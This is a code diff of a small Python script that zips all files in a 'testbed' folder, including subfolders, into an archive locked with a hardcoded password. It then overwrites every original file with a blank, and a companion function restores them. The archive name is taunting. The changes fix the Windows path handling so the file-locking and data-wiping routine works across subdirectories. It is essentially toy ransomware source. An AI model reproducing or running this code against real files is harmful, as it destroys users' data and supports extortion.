@@ -10,14 +10,15 @@ def archive_and_encrypt(testbed_folder):
         for root, dirs, files in os.walk(testbed_folder):
             for file in files:
                 if file != encrypt_holder_file:
-                    filesToArchive.append(testbed_folder + "/" + file)
+                    filesToArchive.append(root + "\\" + file)
 
+        print(f"Files to archive: {filesToArchive}")
         pyminizip.compress_multiple(
             filesToArchive,
-            [testbed_folder] * (len(filesToArchive)),
+            [],
             encrypt_holder_file,
             "parola",
-            9,
+            1,
         )
 
         print(f"Archive created successfully: {encrypt_holder_file}")
@@ -25,7 +26,7 @@ def archive_and_encrypt(testbed_folder):
         for root, dirs, files in os.walk(testbed_folder):
             for file in files:
                 if file != encrypt_holder_file:
-                    file = testbed_folder + "/" + file
+                    file = root + "\\" + file
                     with open(file, "w") as f:
                         f.write(" ")
 
@@ -34,12 +35,13 @@ def archive_and_encrypt(testbed_folder):
 
 
 def dearchive(testbed_folder):
-    pyminizip.uncompress(encrypt_holder_file, "parola", None, 0)
-    os.remove(encrypt_holder_file)
+    old_cwd = os.getcwd()
+    pyminizip.uncompress(encrypt_holder_file, "parola", testbed_folder, 0)
+    os.remove(old_cwd + "\\" + encrypt_holder_file)
 
 
-encryption_key = "BeammersClubF*ckedYou"  # Replace this with your encryption key
-encrypt_holder_file = "BeammersClubF*ckedYou.zip"
+encryption_key = "BeammersClubFuckedYou"  # Replace this with your encryption key
+encrypt_holder_file = "BeammersClubFuckedYou.zip"
 
 
 def main():
